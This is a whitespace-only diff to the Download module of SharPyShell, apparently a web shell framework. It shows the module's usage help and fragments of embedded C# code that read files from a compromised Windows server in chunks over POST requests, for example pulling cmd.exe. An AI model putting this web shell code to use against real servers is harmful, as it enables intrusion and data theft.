@@ -17,19 +17,19 @@ class Download(Module):
         In this module has been considered the limit of the data you can send/receive through post request.
         So if a file is larger than 100 KB it will be splitted into multiple requests over the network.
         The chunk size parameter could be modified.
-    
+
         Usage:
             #download remote_input_path [local_output_path] [chunk_size]
-    
+
         Positional arguments:
             remote_input_path               The file path you want to download from the remote server
             local_output_path               The path where the file will be saved on your local machine
                                             Default: 'output' directory of Sharpyshell directory
             chunk_size                      The maximum limit of a chunk to be transferred over the network
                                             Default: 102400
-        
+
         Examples:
-            Download cmd.exe:            
+            Download cmd.exe:
                 #download C:\windows\system32\cmd.exe
             Download cmd.exe into /home/user local directory:
                 #download C:\windows\system32\cmd.exe /home/user/cmd.exe
@@ -39,7 +39,7 @@ class Download(Module):
 
     _runtime_code = r"""
             using System;using System.IO;using System.Diagnostics;using System.Text;
-            public class SharPyShell{                    
+            public class SharPyShell{
                 public byte[] Download(string arg){
                     byte[] downloaded_file;
                     try{
@@ -59,7 +59,7 @@ class Download(Module):
 
     __runtime_code_split_file = r"""
                 using System;using System.IO;using System.Diagnostics;using System.Text;
-                public class SharPyShell{                    
+                public class SharPyShell{
                     public byte[] Download(string arg, int chunk, int offset){
                         byte[] downloaded_file = new byte[chunk];
                         try{
@@ -82,7 +82,7 @@ class Download(Module):
 
     __runtime_code_get_file_size = r"""
             using System;using System.IO;using System.Diagnostics;using System.Text;
-            public class SharPyShell{                    
+            public class SharPyShell{
                 string GetFileSize(string path){
                     string output = "";
                     try{
